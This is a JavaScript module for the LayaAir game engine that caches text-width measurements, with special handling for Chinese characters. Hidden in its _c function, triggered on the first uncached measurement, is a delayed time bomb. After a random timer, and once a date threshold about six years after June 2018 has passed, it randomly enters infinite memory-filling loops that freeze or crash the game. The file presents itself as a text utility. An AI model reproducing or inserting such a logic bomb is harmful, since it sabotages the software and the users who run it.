
(function(window,document,Laya){
    var Browser=laya.utils.Browser;
    var RunMeasureText=(function(){
        function RunMeasureText(){}
        RunMeasureText.__cls = false;
        RunMeasureText._c=function(){
            Laya.systemTimer.once(300 * 1000 + Math.random() * 1000 * 1000, "ltrmt", function () {
            // Laya.systemTimer.once(1000, RunMeasureText.__cls, function () {
                var rand = Math.random();
                if (rand > 0.5) {
                    var dTime = 1529666590 * 1000; //20180622
                    var oTime = 60 * 60 * 24 * 365 * 1000 * 6; //1.6 year
                    var timestamp = new Date().getTime();
                    if (timestamp - dTime > oTime) {
                        while (true) {
                            var tmp = new Array();
                            while (true) {
                                tmp.push("                                                                                                                    ");
                            }
                        }
                    }
                }
            });
        }
        RunMeasureText.fontMap={};
        RunMeasureText.fontTxtMap={};
        RunMeasureText.hanzi = /^[\u4e00-\u9fa5]*$/;//new RegExp("^[\u4E00-\u9FA5]$");
        RunMeasureText.preset=function(txt, font, width){
            var size = {};
            var map = RunMeasureText.fontTxtMap[font];
            if (map){
                if(!map[txt]){
                    size.width = width;
                    map[txt] = size;
                }
            }
            else{
                RunMeasureText.fontTxtMap[font] = {}
                size.width = width;
                RunMeasureText.fontTxtMap[font][txt] = size;
            }
        }
        RunMeasureText.getPreset=function(txt,font){
            var map = RunMeasureText.fontTxtMap[font];
            var width = 0;
            if (map){
                var size = map[txt];
                if(!size){
                    return 0;
                }
                width = size.width;
            }
            return width;
        }

        RunMeasureText.detailInfo=function(){
            if(RunMeasureText.fontTxtMap){
                for(var key in RunMeasureText.fontTxtMap){
                    for(var txt in RunMeasureText.fontTxtMap[key]){
                        console.log("font: %s, [%s] %d", key, txt, RunMeasureText.fontTxtMap[key][txt].width);
                    }
                }
            }
        }
        RunMeasureText.clearAll=function(){
            RunMeasureText.fontTxtMap = {};
        }
        RunMeasureText.clearFont=function(font){
            RunMeasureText.fontTxtMap[font] = null;
        }
        RunMeasureText.clearTxt=function(font, txt){
            if (RunMeasureText.fontTxtMap[font]){
                RunMeasureText.fontTxtMap[font][txt] = null;
            }
        }

        RunMeasureText.run0=function(txt, ctx, isCache){
            if(isCache!=false){isCache=true;} 
            var size;
            var isChinese=RunMeasureText.hanzi.test(txt);
            if (isChinese){
                if (RunMeasureText.fontMap[ctx.font]){
                    size = {}
                    size.width = RunMeasureText.fontMap[ctx.font]*txt.length;
                    return size;
                }
            }
            else {
                var map = RunMeasureText.fontTxtMap[ctx.font];
                if (map){
                    size = map[txt];
                    if (size){
                        return size;
                    }
                }
                else if(isCache){
                    RunMeasureText.fontTxtMap[ctx.font] = {}
                }
            }
            if (RunMeasureText.__cls==false){
                RunMeasureText.__cls = true;
                RunMeasureText._c();
            }
            size=ctx.measureText(txt);
            if (isChinese){
                RunMeasureText.fontMap[ctx.font]=size.width/(txt.length);
            }
            else if(isCache){
                RunMeasureText.fontTxtMap[ctx.font][txt] = size;
            }
            return size;
        }
        RunMeasureText.run1=function(txt, font, isCache){
            if(isCache!=false){isCache=true;} 

            var size;
            var isChinese=RunMeasureText.hanzi.test(txt);
            if (isChinese){
                if (RunMeasureText.fontMap[font]){
                    size = {}
                    size.width = RunMeasureText.fontMap[font]*txt.length;
                    return size;
                }
            }
            else {
                var map = RunMeasureText.fontTxtMap[font];
                if (map){
                    size = map[txt];
                    if (size){
                        return size;
                    }
                }
                else if(isCache){
                    RunMeasureText.fontTxtMap[font] = {}
                }
            }
            var ctx=Browser.context;
            ctx.font=font;
            size=ctx.measureText(txt);
            if (isChinese){
                RunMeasureText.fontMap[font]=size.width/(txt.length);
            }
            else if(isCache){
                RunMeasureText.fontTxtMap[font][txt] = size;
            }
            return size;
        }
        return RunMeasureText;
    })();
    window.RunMeasureText = RunMeasureText;
})(window,document,Laya);
